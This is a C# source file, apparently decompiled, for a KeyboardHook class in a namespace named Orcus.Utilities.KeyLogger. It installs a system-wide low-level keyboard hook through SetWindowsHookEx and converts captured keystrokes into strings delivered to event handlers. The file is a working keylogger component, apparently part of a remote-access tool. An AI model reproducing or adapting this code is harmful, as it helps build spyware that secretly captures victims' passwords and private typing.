using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Orcus.Native;

namespace Orcus.Utilities.KeyLogger;

internal class KeyboardHook : IDisposable
{
	private const int WM_KEYDOWN = 256;

	private const int WM_SYSKEYDOWN = 260;

	private const int WM_KEYUP = 257;

	private const int WM_SYSKEYUP = 261;

	private NativeMethods.HookProc _keyboardDelegate;

	private IntPtr _keyboardHookHandle;

	private readonly KeyProcessing _keyProcessing;

	public event EventHandler<StringDownEventArgs> StringDown;

	public event EventHandler<StringDownEventArgs> StringUp;

	public event KeyEventHandler KeyDown
	{
		[CompilerGenerated]
		add
		{
			//IL_0010: Unknown result type (might be due to invalid IL or missing references)
			//IL_0016: Expected O, but got Unknown
			KeyEventHandler val = this.KeyDown;
			KeyEventHandler val2;
			do
			{
				val2 = val;
				KeyEventHandler value2 = (KeyEventHandler)Delegate.Combine((Delegate?)(object)val2, (Delegate?)(object)value);
				val = Interlocked.CompareExchange(ref this.KeyDown, value2, val2);
			}
			while (val != val2);
		}
		[CompilerGenerated]
		remove
		{
			//IL_0010: Unknown result type (might be due to invalid IL or missing references)
			//IL_0016: Expected O, but got Unknown
			KeyEventHandler val = this.KeyDown;
			KeyEventHandler val2;
			do
			{
				val2 = val;
				KeyEventHandler value2 = (KeyEventHandler)Delegate.Remove((Delegate?)(object)val2, (Delegate?)(object)value);
				val = Interlocked.CompareExchange(ref this.KeyDown, value2, val2);
			}
			while (val != val2);
		}
	}

	public event EventHandler KeyUp;

	public KeyboardHook()
	{
		_keyProcessing = new KeyProcessing();
		_keyProcessing.StringUp += _keyProcessing_StringUp;
		_keyProcessing.StringDown += _keyProcessing_StringDown;
	}

	private void _keyProcessing_StringDown(object sender, StringDownEventArgs e)
	{
		this.StringDown?.Invoke(this, e);
	}

	private void _keyProcessing_StringUp(object sender, StringDownEventArgs e)
	{
		this.StringUp?.Invoke(this, e);
	}

	public void Dispose()
	{
		Dispose(disposing: true);
		GC.SuppressFinalize(this);
	}

	protected virtual void Dispose(bool disposing)
	{
		if (_keyboardHookHandle != IntPtr.Zero && !NativeMethods.UnhookWindowsHookEx(_keyboardHookHandle))
		{
			int lastWin32Error = Marshal.GetLastWin32Error();
			ErrorReporter.Current.ReportError(new Win32Exception(lastWin32Error), "Keyboard Hook Dispose");
		}
	}

	~KeyboardHook()
	{
		Dispose(disposing: false);
	}

	private IntPtr KeyboardHookProc(int nCode, IntPtr wParam, IntPtr lParam)
	{
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_0059: Expected O, but got Unknown
		//IL_00b4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ba: Expected O, but got Unknown
		if (nCode >= 0)
		{
			int num = wParam.ToInt32();
			KeyboardHookStruct keyboardHookStruct = (KeyboardHookStruct)Marshal.PtrToStructure(lParam, typeof(KeyboardHookStruct));
			if ((this.StringDown != null || this.KeyDown != null) && (num == 256 || num == 260))
			{
				if (this.KeyDown != null)
				{
					KeyEventArgs val = new KeyEventArgs((Keys)keyboardHookStruct.VirtualKeyCode);
					this.KeyDown.Invoke((object)null, val);
				}
				if (this.StringDown != null)
				{
					_keyProcessing.ProcessKeyAction((uint)keyboardHookStruct.VirtualKeyCode, (uint)keyboardHookStruct.ScanCode, isDown: true);
				}
			}
			if ((this.StringUp != null || this.KeyUp != null) && (num == 257 || num == 261))
			{
				if (this.KeyUp != null)
				{
					KeyEventArgs e = new KeyEventArgs((Keys)keyboardHookStruct.VirtualKeyCode);
					this.KeyUp(null, (EventArgs)(object)e);
				}
				if (this.StringUp != null)
				{
					_keyProcessing.ProcessKeyAction((uint)keyboardHookStruct.VirtualKeyCode, (uint)keyboardHookStruct.ScanCode, isDown: false);
				}
			}
		}
		return NativeMethods.CallNextHookEx(_keyboardHookHandle, nCode, wParam, lParam);
	}

	public void Hook()
	{
		_keyboardDelegate = KeyboardHookProc;
		using (Process process = Process.GetCurrentProcess())
		{
			using ProcessModule processModule = process.MainModule;
			_keyboardHookHandle = NativeMethods.SetWindowsHookEx(HookType.WH_KEYBOARD_LL, _keyboardDelegate, NativeMethods.GetModuleHandle(processModule.ModuleName), 0u);
		}
		if (_keyboardHookHandle == IntPtr.Zero)
		{
			throw new Win32Exception(Marshal.GetLastWin32Error());
		}
	}
}
